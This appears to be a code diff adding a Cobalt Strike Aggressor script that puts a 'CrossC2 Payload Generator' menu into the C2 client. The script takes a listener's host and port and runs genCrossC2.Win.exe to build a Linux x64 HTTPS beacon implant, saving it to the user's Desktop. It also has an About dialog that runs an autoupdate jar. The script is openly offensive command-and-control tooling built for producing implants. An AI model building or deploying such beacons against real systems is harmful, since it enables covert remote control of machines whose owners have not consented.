@@ -1,0 +1,90 @@
+menubar("CrossC2", "generator", 2);
+
+# Get the directory of the current script
+$CC2_PATH = script_resource("");
+$CC2_BIN = "genCrossC2.Win.exe";
+
+popup generator {
+    menu "&CrossC2 Payload Generator" {
+        item "&genCrossC2" {
+            genCrossC2()
+        }
+    }
+    item "&About" {
+        projectAbout()
+    }
+}
+
+sub dialogCallBack {
+    $listener = $3['listener'];
+    
+    # Get listener info
+    $listener_info = listener_info($listener);
+    $host = $listener_info['host'];
+    $port = $listener_info['port'];
+
+    # Hardcoded parameters matching linux_beacon.bat
+    $system = "Linux";
+    $arch = "x64";
+    # Use relative path as requested
+    $beaconKeyPath = "./.cobaltstrike.beacon_keys";
+    $rebind_lib = "null";
+    
+    # Generate random filename: linux_beacon_[random].out
+    $randNum = rand(32768); # Windows %RANDOM% is 0-32767
+    $outputName = "linux_beacon_" . $randNum . ".out";
+    
+    # Set output path to Desktop
+    $desktop = [java.lang.System getProperty: "user.home"] . "\\Desktop";
+    $outputFile = $desktop . "\\" . $outputName;
+
+    # Construct command
+    # Use cmd /c cd /d to switch to script directory, then run relative command
+    $scriptDir = script_resource("");
+    $genCC2 = "genCrossC2.Win.exe";
+    
+    # Arguments: IP Port Key Lib System Arch Output
+    $args = $host . " " . $port . " " . $beaconKeyPath . " " . $rebind_lib . " " . $system . " " . $arch . " \"" . $outputFile . "\"";
+    
+    $command = "cmd /c cd /d \"" . $scriptDir . "\" && " . $genCC2 . " " . $args;
+    
+    elog("Executing: " . $command);
+    
+    # Execute
+    $process = exec($command);
+    $data = readAll($process);
+    closef($process);
+    
+    # Check if file exists to determine success (simple check)
+    if (-exists $outputFile) {
+        show_message("[+] Success: " . $outputFile);
+        elog("[+] Success: " . $outputFile);
+    } else {
+        show_message("[-] Failed. Check Script Console for details.");
+        elog("[-] Failed. Output: " . join("\n", $data));
+    }
+}
+
+sub genCrossC2 {
+    $dialog = dialog("CrossC2 Payload Generator", %(listener => "Listener: "), &dialogCallBack);
+    dialog_description($dialog, "Generates Linux x64 HTTPS Beacon (matches linux_beacon.bat logic)");
+    
+    drow_listener($dialog, "listener", "Listener: ");
+    
+    dbutton_action($dialog, "Build");
+    dialog_show($dialog);
+}
+
+sub projectAboutCallback {
+    $autoupdate = "java -jar " . script_resource("autoupdate.jar");
+    exec($autoupdate);
+}
+
+sub projectAbout {
+    $dialog = dialog("Cross C2 About",%(link => "https://github.com/gloxec/CrossC2"), &projectAboutCallback);
+    dialog_description($dialog, "Export CrossC2 Payload");
+    dbutton_action($dialog, "update");
+    drow_text($dialog, "link", "link: ", "");
+    dialog_show($dialog);
+}
+
